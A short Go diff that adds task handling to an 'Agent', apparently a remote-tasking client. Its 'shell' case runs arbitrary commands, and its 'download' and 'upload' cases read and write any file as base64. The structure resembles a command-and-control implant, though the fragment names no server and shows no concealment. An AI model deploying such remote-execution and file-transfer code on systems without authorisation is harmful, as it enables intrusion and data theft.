@@ -88,3 +88,33 @@ func (a *Agent) handleTask(task map[string]interface{}) {
 	taskID := task["ID"].(string)
 	command := task["Command"].(string)
 	args := ""
+	if a, ok := task["Args"].(string); ok {
+		args = a
+	}
+
+	var result string
+	var err error
+
+	switch command {
+	case "shell":
+		result, err = a.commander.Execute(args)
+		if err != nil {
+			result = fmt.Sprintf("error: %v", err)
+		}
+
+	case "download":
+		result, err = a.fileMgr.ReadFileBase64(args)
+		if err != nil {
+			result = fmt.Sprintf("error: %v", err)
+		}
+
+	case "upload":
+		parts := make(map[string]string)
+		json.Unmarshal([]byte(args), &parts)
+		err = a.fileMgr.WriteFileBase64(parts["path"], parts["data"])
+		if err != nil {
+			result = fmt.Sprintf("error: %v", err)
+		} else {
+			result = "file uploaded"
+		}
+
